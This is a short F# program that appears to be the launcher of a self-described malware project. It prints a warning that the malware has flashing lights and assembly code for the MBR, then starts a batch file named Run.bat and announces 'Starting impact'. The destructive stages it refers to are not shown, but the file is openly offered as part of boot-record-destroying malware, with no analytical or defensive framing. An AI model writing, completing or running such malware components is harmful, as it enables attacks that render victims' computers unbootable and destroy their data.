open System.Diagnostics

[<EntryPoint>]
let main argv =
    //Run the Batch process
    let processoCSharp = "Run.bat"
    
    printfn "WARNING: THIS MALWARE HAVE FLASHING LIGHTS, THIS MALWARE HAVE F# CODE AND ASSEMBLY FOR MBR"
    
    try
        // 2. Dispara o C#
        Process.Start(processoCSharp) |> ignore
        printfn "Starting impact"
    with
    | ex -> printfn "Error for the impact: %s" ex.Message

    0 // Close this F# application and keep the Batch running